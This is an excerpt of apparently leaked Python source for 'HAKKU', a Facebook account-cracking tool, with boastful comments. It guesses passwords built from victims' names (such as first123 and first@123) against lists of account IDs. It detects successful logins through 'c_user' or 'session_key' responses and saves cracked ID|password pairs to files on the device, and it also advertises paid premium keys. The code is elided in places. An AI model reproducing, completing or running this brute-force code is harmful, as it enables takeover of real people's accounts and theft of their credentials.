#SOURCE LEAKED BY :HAKKU

#REASON : BECAUSE F*CK HAKKU 😎 
...
----------------------------------------------
 ...
 For Haters: I’m the iPhone, you the Nokia
...
def public():
        ...
        try:
                ...
                print('\033[1;32m exp: first last,firtslast,first123,first@123,firstlast@123,first last@123,firstlast123,first last123')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://facebook.com/profile.php?id=100080987563928&mibextid=ZbWKwL/');menu()
                        ...
                        tks = ("Hi HAKKU Sir, I Need To Buy Your Paid HAKKU PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python HAKKU.py')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [HAKKU-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in HAKKU:
                                ...
                                print('\r\r\033[1;32m [HAKKU-CP] %s | %s'%(ids,pas))

                                open('/sdcard/hakku.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in HAKKU:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [HAKKU-OK] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [Pʀɪɴᴄᴇ-ᴄᴘ] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/Pʀɪɴᴄᴇ-ᴄᴘ.txt','a').write(ids+'|'+pas+'\n')
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                print('\r\r\x1b[38;5;208m [Pʀɪɴᴄᴇ-ᴏᴋ] '+ids+' | '+pas+'\033[1;97m')

                                                open('/sdcard/Pʀɪɴᴄᴇ-ᴏᴋ.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [HAKKU-CP] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/hakku.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [HAKKU-CP] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/hakku.txt','a').write(uid+'|'+pas+'\n')
